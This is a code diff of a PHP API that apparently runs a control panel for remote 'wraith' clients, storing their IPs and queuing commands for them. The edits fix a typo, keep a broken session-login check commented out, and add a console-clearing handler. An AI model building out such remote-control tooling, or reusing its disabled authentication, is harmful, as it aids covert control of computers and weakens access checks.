@@ -4,7 +4,7 @@
 // have an access code defined on login
 
 // Instantly lock the database file to stop weird errors like the file contents disappearing
-$databsase = fopen(dirname(__FILE__)."/db.json", "r+");
+$database = fopen(dirname(__FILE__)."/db.json", "r+");
 flock($database, LOCK_SH | LOCK_EX);
 
 // Include some required functions
@@ -137,12 +137,12 @@ if ($response["requester_type"] === "wraith") {
 		$response["message"] = "Panel login token is invalid. No API calls can be made using this token";
 		respond(false);
 	// Extra check to make sure the panel is actually logged in. Shouldn't be too nescessary but better safe than sorry
-	// Commented out as it does not seem to fully work.
-	} /* elseif (!($_SESSION["LOGGED_IN"] == true && $_SESSION["USERNAME"] == $db["username"] && $_SESSION["PASS"] == $db["PASSWORD"])) {
+	/* Commented out because it doesn't work
+	} elseif (!($_SESSION["LOGGED_IN"] == true && $_SESSION["USERNAME"] == $database["username"] && $_SESSION["PASS"] == $database["PASSWORD"])) {
 		$response["status"] = "ERROR";
 		$response["message"] = "The logged in status of the panel could not be verified. Please log in to the panel before making API calls.";
-		respond(false);
-	} */
+		respond(false); */
+	}
 }
 
 // From now on, all responses must be encrypted as we know the client
@@ -184,15 +184,6 @@ if ($response["requester_type"] === "wraith") {
 		// Assign blank fields
 		$newwraith["extra_info"] = [];
 		$newwraith["command_queue"] = [];
-		// Command queue will be a named array with the
-		// following fields.
-		// command_id => UUID of the command
-		// command_name => Name of the command
-		// args => List of arguments the command has
-		// issue_time => The timestamp of when command issued
-		// read_time => The timestamp when command was fetched
-		// complete_status => Whether the command was completed
-		// result => The output of the command
 
 		// Populate with server-acquired variables
 		$newwraith["extip"] = get_client_ip();
@@ -316,7 +307,12 @@ if ($response["requester_type"] === "wraith") {
 	} elseif ($req_type === "clearconsole") {
 		// Clear the stored command list in database
 		
+		$db = get_db();
+		$db["console_contents"] = [];
+		writedb($db);
 		
+		$response["status"] = "SUCCESS";
+		respond();
 		
 	} elseif ($req_type === "settings") {
 		// View/modify settings
